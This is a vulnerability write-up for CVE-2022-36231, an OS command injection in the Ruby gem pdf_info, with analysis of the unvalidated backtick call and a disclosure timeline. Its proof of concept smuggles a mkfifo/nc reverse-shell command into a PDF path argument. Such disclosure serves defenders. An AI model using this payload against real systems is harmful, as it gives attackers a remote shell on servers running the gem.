# CVE-2022-36231

The ruby gem [pdf_info](https://rubygems.org/gems/pdf_info) <= 0.5.3 is vulnerable to OS Command Injection when executing a method on a `PDF::Info` object.

An attacker using a specially crafted payload may execute OS commands by using command chaining.

## Vulnerability Analysis

When creating a new `PDF::Info` object the `initialize` command is called

```ruby
def initialize(pdf_path)
  @pdf_path = pdf_path
end
```

During object initalization there is no validation performed and the user provided path is used. 

We can create a PDF::Info object and return the metadta of a PDF with the following.

```ruby
#!/usr/bin/env ruby

require 'pdf/info'

info = PDF::Info.new("./pdf/sample1.pdf")
pp info.metadata
```

When we call the `metadata` method on the `PDF::Info` object a call is made to the `process_output` method with the argument passed being the `command` method.

The `command` method makes use of the `@pdf_info` class variable to execute the `pdfinfo` command on the system using the following code snippet to return the output of the command.

```ruby
output = `#{self.class.command_path} -enc UTF-8 -f 1 -l -1 "#{@pdf_path}" 2> /dev/null`
```

As with the `initialize` method there is no validation performed on the `@pdf_path` variable. This allows us to make use of command chaining with `;` to execute an arbitrary command.

```ruby
info = PDF::Info.new('pdf/sample1.pdf; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444>/tmp/f)')

pp info.metadata
```

The above code snippet will execute a reverse shell to `127.0.0.1` on port `4444`


![Shell](https://github.com/affix/CVE-2022-36231/raw/main/img/shell.png)

## Disclosure Details

* 2022-07-20 :: Reported to Vendor
* 2022-08-30 :: Follow up with Vendor
* 2022-09-30 :: Apply for CVE
* 2022-10-26 :: Publish Vulnerability
